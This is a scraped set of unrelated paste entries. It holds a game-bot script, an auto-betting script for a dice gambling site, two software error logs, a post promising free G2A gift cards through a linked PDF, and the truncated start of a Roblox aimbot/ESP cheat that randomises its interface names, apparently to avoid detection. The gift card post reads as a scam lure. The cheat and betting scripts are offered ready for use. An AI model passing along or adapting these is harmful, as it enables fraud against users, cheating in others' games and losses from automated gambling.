		if (mHeaderRecords[i].GetFilename() == nullptr || mHeaderRecords[i].GetFilename()[0] == '\0')
		{
			mHeaderRecords[i].mOffset = 0;
		}
		else
		{
			mHeaderRecords[i].mOffset = offset;
			offset += mDataRecords[i]->GetSize();
		}
	}"
cQTjDyrk,[RS]Find fishing spots [2024 edt],WarPie90,Delphi,Friday 5th of July 2024 02:25:26 PM CDT,"function FindFishingSpot(scanTime: Int32=500): T2DPointArray;
var
  i: Int32;
  SUM,TPA,u: TPointArray;
  tmp: T2DPointArray;
  t: Double;
begin
  t := PerformanceTimer() + scanTime;
  // this is the new magic, we find the sea btw:
  // we extract lone pixels, pixels that are alone and not connected to other pixels
  // we only stack those! So basically we want the pixel noise, nothing else.
  while PerformanceTimer() < t do
  begin
    TPA := Target.FindColor(ColorTolerance($A0816E,3.000,EColorSpace.HSL, [2.183,0.540,0.278]));
    tmp := TPA.Grow(1).Difference(TPA).Cluster(2);
    SUM += tmp.ExcludeSize(1, __GT__).Merge();  
  end;
  

  Result := SUM.Grow(1).Cluster(5);
  Result := Result.ExcludeSize(100, __LT__);

  for i:=0 to High(Result) do
  begin
    img.DrawColor := Random($FFFFFF);
    img.DrawTPA(Result[i]);
    img.DrawCircleAA(Result[i].MinAreaCircle().Center, Result[i].MinAreaCircle().Radius);
  end;
end;"
0FmvzsC6,crazybot snowybot,coinwalk,JavaScript,Friday 5th of July 2024 02:17:11 PM CDT,"var nion = parseFloat(document.getElementById('pct_balance').value);
var smartz = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((nion/2400).toFixed(8));
var winnerdinner = parseFloat(document.getElementById('pct_balance').value);
var tens = (prefit*10);
var sevens = (prefit*6.99);
var eights = (prefit*7.99);
var james = parseFloat(document.getElementById('pct_balance').value);
var belance = parseFloat(document.getElementById('pct_balance').value);
var snowy = 0;
var beast = prefit;
var greedy =  parseFloat(document.getElementById('pct_balance').value);
var bolance = parseFloat(document.getElementById('pct_balance').value);
var golum = parseFloat(document.getElementById('pct_balance').value);
var snow = parseFloat(document.getElementById('pct_balance').value);



function go(){
bolance = parseFloat(document.getElementById('pct_balance').value);
if (bolance<snow){
belance = belance-beast;
snow = parseFloat(bolance);
}
if (bolance>snow){
belance = belance+beast;
snow = parseFloat(bolance);
}
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=snowy)){
        beast = beast*2;
        snowy = parseFloat(belance);
}
if ((((nion/10)-beast)<=0)&&(belance>=(james+(nion/10)))&&(belance>(((Math.floor(belance/tens))*tens)+eights))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((nion/10)-beast)<=0)&&(belance>=(james+(nion/10)))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((nion/10)-beast)<=0)&&(belance>=(james+(nion/10)))&&(belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))){
snowy = parseFloat(belance);
beast = prefit*2;
james = parseFloat(belance);
}
if ((((belance/20)-beast)<=0)&&(belance<=james)&&(belance>(((Math.floor(belance/tens))*tens)+eights))){
snowy = 0;
beast = prefit;
}
if ((((belance/20)-beast)<=0)&&(belance<=james)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
snowy = 0;
beast = prefit;
}
if ((((belance/20)-beast)<=0)&&(belance<=james)&&(belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))){
snowy = parseFloat(belance);
beast = prefit*2;
}
if ((((belance/40)-beast)<=0)&&(belance>james)&&(belance>(((Math.floor(belance/tens))*tens)+eights))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((belance/40)-beast)<=0)&&(belance>james)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((belance/40)-beast)<=0)&&(belance>james)&&(belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))){
snowy = parseFloat(belance);
beast = prefit*2;
james = parseFloat(belance);
}
if (belance>=24000){
console.log(""winner winner chicken dinner"");
    return;
}
var cat = ((belance-smartz).toFixed(8));
console.log(""profit"");
console.log(cat);
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 10);
}
go();
"
sxnbbR9X,Untitled,errorxyz,Python,Friday 5th of July 2024 01:40:07 PM CDT,"test (windows-latest, 3.12) 

================================== FAILURES ===================================
_____________________________ test_udp_start_stop _____________________________

caplog_async = <test.conftest.AsyncLogCaptureFixture object at 0x00000296310604D0>

>   ???

test\mitmproxy\proxy\test_mode_servers.py:259: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
mitmproxy\proxy\mode_servers.py:131: in start
    await self._start()
mitmproxy\proxy\mode_servers.py:250: in _start
    self._servers = await self.listen(host, port)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

self = <mitmproxy.proxy.mode_servers.DnsInstance object at 0x0000029631061490>
host = '127.0.0.1', port = 64043

    async def listen(
        self, host: str, port: int
    ) -> list[asyncio.Server | mitmproxy_rs.UdpServer]:
        if self.mode.transport_protocol not in (""tcp"", ""udp"", ""both""):
            raise AssertionError(self.mode.transport_protocol)
    
        servers: list[asyncio.Server | mitmproxy_rs.UdpServer] = []
        if self.mode.transport_protocol in (""tcp"", ""both""):
            # workaround for https://github.com/python/cpython/issues/89856:
            # We want both IPv4 and IPv6 sockets to bind to the same port.
            # This may fail (https://github.com/mitmproxy/mitmproxy/pull/5542#issuecomment-1222803291),
            # so we try to cover the 99% case and then give up and fall back to what asyncio does.
            if port == 0:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.bind(("""", 0))
                    port = s.getsockname()[1]
                    s.close()
                    servers.append(
                        await asyncio.start_server(self.handle_stream, host, port)
                    )
                except Exception as e:
                    logger.debug(
                        f""Failed to listen on a single port ({e!r}), falling back to default behavior.""
                    )
                    port = 0
                    servers.append(
                        await asyncio.start_server(self.handle_stream, host, port)
                    )
            else:
                servers.append(
                    await asyncio.start_server(self.handle_stream, host, port)
                )
        if self.mode.transport_protocol in (""udp"", ""both""):
            # we start two servers for dual-stack support.
            # On Linux, this would also be achievable by toggling IPV6_V6ONLY off, but this here works cross-platform.
            if host == """":
                ipv4 = await mitmproxy_rs.start_udp_server(
                    ""0.0.0.0"",
                    port,
                    self.handle_udp_stream,
                )
                servers.append(ipv4)
                try:
                    ipv6 = await mitmproxy_rs.start_udp_server(
                        ""::"",
                        ipv4.getsockname()[1],
                        self.handle_udp_stream,
                    )
                    servers.append(ipv6)  # pragma: no cover
                except Exception:  # pragma: no cover
                    logger.debug(""Failed to listen on '::', listening on IPv4 only."")
            else:
                servers.append(
>                   await mitmproxy_rs.start_udp_server(
                        host,
                        port,
                        self.handle_udp_stream,
                    )
                )
E               RuntimeError: Failed to bind UDP socket to 127.0.0.1:64043
E               
E               Caused by:
E                   An attempt was made to access a socket in a way forbidden by its access permissions. (os error 10013)

mitmproxy\proxy\mode_servers.py:325: RuntimeError
---------------------------- Captured log teardown ----------------------------
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: <Task pending name='Task-991' coro=<IocpProactor.accept.<locals>.accept_coro() running at C:\hostedtoolcache\windows\Python\3.12.4\x64\Lib\asyncio\windows_events.py:566> wait_for=<_OverlappedFuture cancelled>>
_____________________________ test_udp_dual_stack _____________________________

caplog_async = <test.conftest.AsyncLogCaptureFixture object at 0x0000029632ECA120>

>   ???

test\mitmproxy\proxy\test_mode_servers.py:299: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
mitmproxy\proxy\mode_servers.py:131: in start
    await self._start()
mitmproxy\proxy\mode_servers.py:250: in _start
    self._servers = await self.listen(host, port)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

self = <mitmproxy.proxy.mode_servers.DnsInstance object at 0x0000029632EC8710>
host = '', port = 64056

    async def listen(
        self, host: str, port: int
    ) -> list[asyncio.Server | mitmproxy_rs.UdpServer]:
        if self.mode.transport_protocol not in (""tcp"", ""udp"", ""both""):
            raise AssertionError(self.mode.transport_protocol)
    
        servers: list[asyncio.Server | mitmproxy_rs.UdpServer] = []
        if self.mode.transport_protocol in (""tcp"", ""both""):
            # workaround for https://github.com/python/cpython/issues/89856:
            # We want both IPv4 and IPv6 sockets to bind to the same port.
            # This may fail (https://github.com/mitmproxy/mitmproxy/pull/5542#issuecomment-1222803291),
            # so we try to cover the 99% case and then give up and fall back to what asyncio does.
            if port == 0:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.bind(("""", 0))
                    port = s.getsockname()[1]
                    s.close()
                    servers.append(
                        await asyncio.start_server(self.handle_stream, host, port)
                    )
                except Exception as e:
                    logger.debug(
                        f""Failed to listen on a single port ({e!r}), falling back to default behavior.""
                    )
                    port = 0
                    servers.append(
                        await asyncio.start_server(self.handle_stream, host, port)
                    )
            else:
                servers.append(
                    await asyncio.start_server(self.handle_stream, host, port)
                )
        if self.mode.transport_protocol in (""udp"", ""both""):
            # we start two servers for dual-stack support.
            # On Linux, this would also be achievable by toggling IPV6_V6ONLY off, but this here works cross-platform.
            if host == """":
>               ipv4 = await mitmproxy_rs.start_udp_server(
                    ""0.0.0.0"",
                    port,
                    self.handle_udp_stream,
                )
E               RuntimeError: Failed to bind UDP socket to 0.0.0.0:64056
E               
E               Caused by:
E                   An attempt was made to access a socket in a way forbidden by its access permissions. (os error 10013)

mitmproxy\proxy\mode_servers.py:308: RuntimeError
---------------------------- Captured log teardown ----------------------------
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: <Task pending name='Task-995' coro=<IocpProactor.accept.<locals>.accept_coro() running at C:\hostedtoolcache\windows\Python\3.12.4\x64\Lib\asyncio\windows_events.py:566> wait_for=<_OverlappedFuture cancelled>>
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: <Task pending name='Task-996' coro=<IocpProactor.accept.<locals>.accept_coro() running at C:\hostedtoolcache\windows\Python\3.12.4\x64\Lib\asyncio\windows_events.py:566> wait_for=<_OverlappedFuture cancelled>>
__________________________ test_dns_start_stop[udp] ___________________________

caplog_async = <test.conftest.AsyncLogCaptureFixture object at 0x0000029631093740>
transport_protocol = 'udp'

>   ???

test\mitmproxy\proxy\test_mode_servers.py:329: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
mitmproxy\proxy\mode_servers.py:131: in start
    await self._start()
mitmproxy\proxy\mode_servers.py:250: in _start
    self._servers = await self.listen(host, port)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

self = <mitmproxy.proxy.mode_servers.DnsInstance object at 0x000002962F32F860>
host = '127.0.0.1', port = 64063

    async def listen(
        self, host: str, port: int
    ) -> list[asyncio.Server | mitmproxy_rs.UdpServer]:
        if self.mode.transport_protocol not in (""tcp"", ""udp"", ""both""):
            raise AssertionError(self.mode.transport_protocol)
    
        servers: list[asyncio.Server | mitmproxy_rs.UdpServer] = []
        if self.mode.transport_protocol in (""tcp"", ""both""):
            # workaround for https://github.com/python/cpython/issues/89856:
            # We want both IPv4 and IPv6 sockets to bind to the same port.
            # This may fail (https://github.com/mitmproxy/mitmproxy/pull/5542#issuecomment-1222803291),
            # so we try to cover the 99% case and then give up and fall back to what asyncio does.
            if port == 0:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.bind(("""", 0))
                    port = s.getsockname()[1]
                    s.close()
                    servers.append(
                        await asyncio.start_server(self.handle_stream, host, port)
                    )
                except Exception as e:
                    logger.debug(
                        f""Failed to listen on a single port ({e!r}), falling back to default behavior.""
                    )
                    port = 0
                    servers.append(
                        await asyncio.start_server(self.handle_stream, host, port)
                    )
            else:
                servers.append(
                    await asyncio.start_server(self.handle_stream, host, port)
                )
        if self.mode.transport_protocol in (""udp"", ""both""):
            # we start two servers for dual-stack support.
            # On Linux, this would also be achievable by toggling IPV6_V6ONLY off, but this here works cross-platform.
            if host == """":
                ipv4 = await mitmproxy_rs.start_udp_server(
                    ""0.0.0.0"",
                    port,
                    self.handle_udp_stream,
                )
                servers.append(ipv4)
                try:
                    ipv6 = await mitmproxy_rs.start_udp_server(
                        ""::"",
                        ipv4.getsockname()[1],
                        self.handle_udp_stream,
                    )
                    servers.append(ipv6)  # pragma: no cover
                except Exception:  # pragma: no cover
                    logger.debug(""Failed to listen on '::', listening on IPv4 only."")
            else:
                servers.append(
>                   await mitmproxy_rs.start_udp_server(
                        host,
                        port,
                        self.handle_udp_stream,
                    )
                )
E               RuntimeError: Failed to bind UDP socket to 127.0.0.1:64063
E               
E               Caused by:
E                   An attempt was made to access a socket in a way forbidden by its access permissions. (os error 10013)

mitmproxy\proxy\mode_servers.py:325: RuntimeError
---------------------------- Captured log teardown ----------------------------
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: <Task pending name='Task-999' coro=<IocpProactor.accept.<locals>.accept_coro() running at C:\hostedtoolcache\windows\Python\3.12.4\x64\Lib\asyncio\windows_events.py:566> wait_for=<_OverlappedFuture cancelled>>
__________________________ test_dns_start_stop[tcp] ___________________________

caplog_async = <test.conftest.AsyncLogCaptureFixture object at 0x0000029631062390>
transport_protocol = 'tcp'

>   ???

test\mitmproxy\proxy\test_mode_servers.py:329: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
mitmproxy\proxy\mode_servers.py:131: in start
    await self._start()
mitmproxy\proxy\mode_servers.py:250: in _start
    self._servers = await self.listen(host, port)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

self = <mitmproxy.proxy.mode_servers.DnsInstance object at 0x0000029631018AD0>
host = '127.0.0.1', port = 64070

    async def listen(
        self, host: str, port: int
    ) -> list[asyncio.Server | mitmproxy_rs.UdpServer]:
        if self.mode.transport_protocol not in (""tcp"", ""udp"", ""both""):
            raise AssertionError(self.mode.transport_protocol)
    
        servers: list[asyncio.Server | mitmproxy_rs.UdpServer] = []
        if self.mode.transport_protocol in (""tcp"", ""both""):
            # workaround for https://github.com/python/cpython/issues/89856:
            # We want both IPv4 and IPv6 sockets to bind to the same port.
            # This may fail (https://github.com/mitmproxy/mitmproxy/pull/5542#issuecomment-1222803291),
            # so we try to cover the 99% case and then give up and fall back to what asyncio does.
            if port == 0:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.bind(("""", 0))
                    port = s.getsockname()[1]
                    s.close()
                    servers.append(
                        await asyncio.start_server(self.handle_stream, host, port)
                    )
                except Exception as e:
                    logger.debug(
                        f""Failed to listen on a single port ({e!r}), falling back to default behavior.""
                    )
                    port = 0
                    servers.append(
                        await asyncio.start_server(self.handle_stream, host, port)
                    )
            else:
                servers.append(
                    await asyncio.start_server(self.handle_stream, host, port)
                )
        if self.mode.transport_protocol in (""udp"", ""both""):
            # we start two servers for dual-stack support.
            # On Linux, this would also be achievable by toggling IPV6_V6ONLY off, but this here works cross-platform.
            if host == """":
                ipv4 = await mitmproxy_rs.start_udp_server(
                    ""0.0.0.0"",
                    port,
                    self.handle_udp_stream,
                )
                servers.append(ipv4)
                try:
                    ipv6 = await mitmproxy_rs.start_udp_server(
                        ""::"",
                        ipv4.getsockname()[1],
                        self.handle_udp_stream,
                    )
                    servers.append(ipv6)  # pragma: no cover
                except Exception:  # pragma: no cover
                    logger.debug(""Failed to listen on '::', listening on IPv4 only."")
            else:
                servers.append(
>                   await mitmproxy_rs.start_udp_server(
                        host,
                        port,
                        self.handle_udp_stream,
                    )
                )
E               RuntimeError: Failed to bind UDP socket to 127.0.0.1:64070
E               
E               Caused by:
E                   An attempt was made to access a socket in a way forbidden by its access permissions. (os error 10013)

mitmproxy\proxy\mode_servers.py:325: RuntimeError
---------------------------- Captured log teardown ----------------------------
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: <Task pending name='Task-1002' coro=<IocpProactor.accept.<locals>.accept_coro() running at C:\hostedtoolcache\windows\Python\3.12.4\x64\Lib\asyncio\windows_events.py:566> wait_for=<_OverlappedFuture cancelled>>
"
Ei0aiJmE,üéÅ G2A.COM FREE GIFT CARD GUIDE JULY 2024 V3üéÅ,BitcoinScript2020,GetText,Friday 5th of July 2024 01:39:11 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
05 > 10 July 2024"
6H4srp1u,immich 1.107.2 error log,mrdrewk,JSON,Friday 5th of July 2024 01:31:19 PM CDT,"[Nest] 26208  - 07/05/2024, 11:24:02 AM     LOG [Api:EventRepository] Initialized websocket server
Migration ""AddFaceSearchRelation1718486162779"" failed, error: internal error: entered unreachable code
QueryFailedError: internal error: entered unreachable code
    at PostgresQueryRunner.query (/app/immich/server/node_modules/typeorm/driver/postgres/PostgresQueryRunner.js:219:19)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async AddFaceSearchRelation1718486162779.up (/app/immich/server/dist/migrations/1718486162779-AddFaceSearchRelation.js:23:9)
    at async MigrationExecutor.executePendingMigrations (/app/immich/server/node_modules/typeorm/migration/MigrationExecutor.js:225:17)
    at async DataSource.runMigrations (/app/immich/server/node_modules/typeorm/data-source/DataSource.js:265:35)
    at async DatabaseRepository.runMigrations (/app/immich/server/dist/repositories/database.repository.js:169:9)
    at async /app/immich/server/dist/services/database.service.js:134:17
    at async /app/immich/server/dist/repositories/database.repository.js:177:23 {
  query: '\n' +
    '            CREATE INDEX face_index ON face_search\n' +
    '            USING hnsw (embedding vector_cosine_ops)\n' +
    '            WITH (ef_construction = 300, m = 16)',
  parameters: undefined,
  driverError: error: internal error: entered unreachable code
      at /app/immich/server/node_modules/pg/lib/client.js:526:17
      at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
      at async PostgresQueryRunner.query (/app/immich/server/node_modules/typeorm/driver/postgres/PostgresQueryRunner.js:184:25)
      at async AddFaceSearchRelation1718486162779.up (/app/immich/server/dist/migrations/1718486162779-AddFaceSearchRelation.js:23:9)
      at async MigrationExecutor.executePendingMigrations (/app/immich/server/node_modules/typeorm/migration/MigrationExecutor.js:225:17)
      at async DataSource.runMigrations (/app/immich/server/node_modules/typeorm/data-source/DataSource.js:265:35)
      at async DatabaseRepository.runMigrations (/app/immich/server/dist/repositories/database.repository.js:169:9)
      at async /app/immich/server/dist/services/database.service.js:134:17
      at async /app/immich/server/dist/repositories/database.repository.js:177:23 {
    length: 82,
    severity: 'ERROR',
    code: 'XX000',
    detail: undefined,
    hint: undefined,
    position: undefined,
    internalPosition: undefined,
    internalQuery: undefined,
    where: undefined,
    schema: undefined,
    table: undefined,
    column: undefined,
    dataType: undefined,
    constraint: undefined,
    file: 'utils.rs',
    line: '21',
    routine: undefined
  },
  length: 82,
  severity: 'ERROR',
  code: 'XX000',
  detail: undefined,
  hint: undefined,
  position: undefined,
  internalPosition: undefined,
  internalQuery: undefined,
  where: undefined,
  schema: undefined,
  table: undefined,
  column: undefined,
  dataType: undefined,
  constraint: undefined,
  file: 'utils.rs',
  line: '21',
  routine: undefined
}
node:internal/process/promises:391
    triggerUncaughtException(err, true /* fromPromise */);
    ^

QueryFailedError: internal error: entered unreachable code
    at PostgresQueryRunner.query (/app/immich/server/node_modules/typeorm/driver/postgres/PostgresQueryRunner.js:219:19)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async AddFaceSearchRelation1718486162779.up (/app/immich/server/dist/migrations/1718486162779-AddFaceSearchRelation.js:23:9)
    at async MigrationExecutor.executePendingMigrations (/app/immich/server/node_modules/typeorm/migration/MigrationExecutor.js:225:17)
    at async DataSource.runMigrations (/app/immich/server/node_modules/typeorm/data-source/DataSource.js:265:35)
    at async DatabaseRepository.runMigrations (/app/immich/server/dist/repositories/database.repository.js:169:9)
    at async /app/immich/server/dist/services/database.service.js:134:17
    at async /app/immich/server/dist/repositories/database.repository.js:177:23 {
  query: '\n' +
    '            CREATE INDEX face_index ON face_search\n' +
    '            USING hnsw (embedding vector_cosine_ops)\n' +
    '            WITH (ef_construction = 300, m = 16)',
  parameters: undefined,
  driverError: error: internal error: entered unreachable code
      at /app/immich/server/node_modules/pg/lib/client.js:526:17
      at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
      at async PostgresQueryRunner.query (/app/immich/server/node_modules/typeorm/driver/postgres/PostgresQueryRunner.js:184:25)
      at async AddFaceSearchRelation1718486162779.up (/app/immich/server/dist/migrations/1718486162779-AddFaceSearchRelation.js:23:9)
      at async MigrationExecutor.executePendingMigrations (/app/immich/server/node_modules/typeorm/migration/MigrationExecutor.js:225:17)
      at async DataSource.runMigrations (/app/immich/server/node_modules/typeorm/data-source/DataSource.js:265:35)
      at async DatabaseRepository.runMigrations (/app/immich/server/dist/repositories/database.repository.js:169:9)
      at async /app/immich/server/dist/services/database.service.js:134:17
      at async /app/immich/server/dist/repositories/database.repository.js:177:23 {
    length: 82,
    severity: 'ERROR',
    code: 'XX000',
    detail: undefined,
    hint: undefined,
    position: undefined,
    internalPosition: undefined,
    internalQuery: undefined,
    where: undefined,
    schema: undefined,
    table: undefined,
    column: undefined,
    dataType: undefined,
    constraint: undefined,
    file: 'utils.rs',
    line: '21',
    routine: undefined
  },
  length: 82,
  severity: 'ERROR',
  code: 'XX000',
  detail: undefined,
  hint: undefined,
  position: undefined,
  internalPosition: undefined,
  internalQuery: undefined,
  where: undefined,
  schema: undefined,
  table: undefined,
  column: undefined,
  dataType: undefined,
  constraint: undefined,
  file: 'utils.rs',
  line: '21',
  routine: undefined
}

Node.js v20.15.0
api worker exited with code 1
Starting api worker"
QT5a6uzF,FPS,zdytor,Lua,Friday 5th of July 2024 01:21:10 PM CDT,"-----Credits to Lazy Autistic Devs.
-----Works on almost all FPS Games accept Phantom Forces works on CBRO, Strucid, ETC.
pcall(function()
local espcolor = Color3.fromRGB(140, 69, 102)
local wallhack_esp_transparency = .4
local gui_hide_button = {Enum.KeyCode.LeftControl, ""h""}
local plrs = game:GetService(""Players"")
local lplr = game:GetService(""Players"").LocalPlayer
local TeamBased = true ; local teambasedswitch = ""]""
local presskeytoaim = true; local aimkey = ""t""
aimbothider = false; aimbothiderspeed = .5
local Aim_Assist = false ; Aim_Assist_Key = {Enum.KeyCode.LeftControl, ""z""}
local espupdatetime = 5; autoesp = false; local charmsesp = true
local movementcounting = true




local mouselock = false
local canaimat = true
local lockaim = true; local lockangle = 5
local ver = ""2.4""
local cam = game.Workspace.CurrentCamera
local BetterDeathCount = true
local ballisticsboost = 0

local mouse = lplr:GetMouse()
local switch = false
local key = ""k""
local aimatpart = nil
local lightesp = false

local abs = math.abs

local Gui = Instance.new(""ScreenGui"")
local Move = Instance.new(""Frame"")
local Main = Instance.new(""Frame"")
local EspStatus = Instance.new(""TextLabel"")
local st1 = Instance.new(""TextLabel"")
local st1_2 = Instance.new(""TextLabel"")
local st1_3 = Instance.new(""TextBox"")
local Name = Instance.new(""TextLabel"")
--Properties:

Gui.Parent = plrs.LocalPlayer:WaitForChild(""PlayerGui"")


local aimbotstatus = {""qc"", ""qr"", ""qe"", ""qd"", ""qi"", ""qt"", ""qs"", ""dd"", ""sp"", ""ql"", ""qa"", ""qd"", ""qs""}
local gotstring = 0
local function getrandomstring()
	gotstring = gotstring+666
	local str = """"
	local randomstring = {""a"", ""b"", ""c"", ""d"", ""e"", ""f"", ""g"", ""h"", ""i"", ""g"", ""k"", ""l"", ""m"", ""o"", ""p"", ""q"", ""r"", ""s"", ""t"", ""u"", ""v"", ""w"", ""x"", ""y"", ""z"",
		 ""–∞"",""–±"",""–≤"",""–≥"",""–¥"",""–µ"",""—ë"",""–∂"",""–∑"",""–∏"",""–π"",""–∫"",""–ª"",""–º"",""–æ"",""–ø"",""—Ä"",""—Å"",""—Ç"",""—É"",""—Ñ"",""—Ö"",""—á"",""—â"",""—ä"",""—ã"",""—ä"",""—ç"",""—é"",""—è"", ""`"", ""$"", 
		""0"",""1"",""2"",""3"",""4"",""5"",""6"",""7"",""8"",""9"", }
	local counting123 = 0
	for i, v in ipairs(randomstring) do
		counting123 = i
	end
	do
		math.randomseed(tick()+gotstring)
		for i = 3, math.random(1,100) do
				math.randomseed(i+tick()+gotstring)
				
				local oneortwo = math.random(1,2)
				if oneortwo == 2 then
					math.randomseed(i+tick()+gotstring)
					str = str..""""..randomstring[math.random(1, counting123)]
				else
					math.randomseed(i+tick()+gotstring)
					str = str..""""..string.upper(randomstring[math.random(1, counting123)])
				end
			
		end
	end
	return str
end
local mousedown = false
local isonmovething = false
local mouseoffset = Vector2.new()
local mousedown = false
local bspeed = 3584
local aimbotoffset = {dd = "":"", sp = "" "", qa = ""a"", qb = ""b"",qc = ""c"", qd = ""d"", qe = ""e"", qf = ""f"", qg = ""g"" , qh = ""h"" , qi = ""i"", qj = ""j"", qk = ""k"", ql = ""l"", qm = ""m"", qn = ""n"", qo = ""o"", qp = ""p"", qq = ""q"", qr = ""r"", qs = ""s"", qt = ""t"", qu = ""u"", qv = ""w"", qx = ""x"", qy = ""y"", qz = ""z""}



Gui.Name = getrandomstring()

Move.Name = getrandomstring()
Move.Draggable = true
Move.Parent = Gui
Move.BackgroundColor3 = Color3.new(0.0431373, 1, 0.0745098)
Move.BackgroundTransparency = 0.40000000596046
Move.BorderSizePixel = 0
Move.Position = UDim2.new(0.5, 0,0.018, 0)
Move.Size = UDim2.new(0, 320, 0, 30)

Move.MouseEnter:Connect(function()
	
	isonmovething = true
	
end)
Move.MouseLeave:Connect(function()
	
	isonmovething = mousedown and true or false
end)
mouse.Button1Down:connect(function()
	mousedown = true
	mouseoffset = Move.AbsolutePosition - Vector2.new(mouse.X, mouse.Y)
end)
mouse.Button1Up:connect(function()
	mousedown = false
end)

mouse.Move:Connect(function()
	if isonmovething == true and mousedown then
		Move.Position = UDim2.new(0, mouseoffset.X + mouse.X, 0, mouseoffset.Y + mouse.Y)
	end
end)
local function uc (st)
	local ast = """"
	for i, v in ipairs(st) do
		local let = aimbotoffset[v]
		ast = ast..let
	end
	return ast
end

Main.Name = getrandomstring()
Main.Parent = Move
Main.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
Main.BackgroundTransparency = 0.69999998807907
Main.Position = UDim2.new(0, 0, 0.995670795, 0)
Main.Size = UDim2.new(1.0000006, 0, 11.2, 0)

st1.Name = getrandomstring()
st1.Parent = Main
st1.BackgroundColor3 = Color3.new(1, 1, 1)
st1.BackgroundTransparency = 1
st1.Position = UDim2.new(0, 0, 0, 0)
st1.Size = UDim2.new(1, 0, 0.161862016, 0)
st1.Font = Enum.Font.ArialBold
st1.Text = uc(aimbotstatus)
st1.TextColor3 = Color3.new(0.0431373, 1, 0.0745098)
st1.TextScaled = true
st1.TextSize = 14
st1.TextWrapped = true

st1_2.Name = getrandomstring()
st1_2.Parent = Main
st1_2.BackgroundColor3 = Color3.new(1, 1, 1)
st1_2.BackgroundTransparency = 1
st1_2.Position = UDim2.new(0, 0, 0.375590861, 0)
st1_2.Size = UDim2.new(0.999999881, 0, 0.161862016, 0)
st1_2.Font = Enum.Font.ArialBold
st1_2.TextXAlignment = Enum.TextXAlignment.Left
st1_2.Text = ""Current ballistics: 0""
st1_2.TextColor3 = Color3.new(0.0431373, 1, 0.0745098)
st1_2.TextScaled = true
st1_2.TextSize = 14
st1_2.TextWrapped = true

local aimbothiderbox = Instance.new(""TextBox"")
aimbothiderbox.Name = getrandomstring()
aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" off""
aimbothiderbox.Size = UDim2.new(1, 0,0.162, 0)
aimbothiderbox.TextScaled = true
aimbothiderbox.TextColor3 =Color3.fromRGB(255, 0, 0)
aimbothiderbox.Position = UDim2.new(0, 0,0.853, 0)
aimbothiderbox.BackgroundTransparency = 1
aimbothiderbox.Parent = Main

st1_3.Name = getrandomstring()
st1_3.Parent = Main
st1_3.BackgroundColor3 = Color3.new(1, 1, 1)
st1_3.BackgroundTransparency = 1
st1_3.Position = UDim2.new(0, 0, 0.18558608, 0)
st1_3.Size = UDim2.new(0.999999881, 0, 0.161862016, 0)
st1_3.Font = Enum.Font.ArialBold
st1_3.Text = ""Bullet speed = 3584""
st1_3.TextColor3 = Color3.new(0.0431373, 1, 0.0745098)
st1_3.TextScaled = true
st1_3.TextSize = 14
st1_3.TextWrapped = true
local teambasedstatus = st1_3:Clone()
teambasedstatus.Parent = Main
teambasedstatus.TextScaled = true
teambasedstatus.Position = UDim2.new(0, 0,.7, 0)
teambasedstatus.Size = UDim2.new(1, 0,.1, 0)
teambasedstatus.Name = getrandomstring()
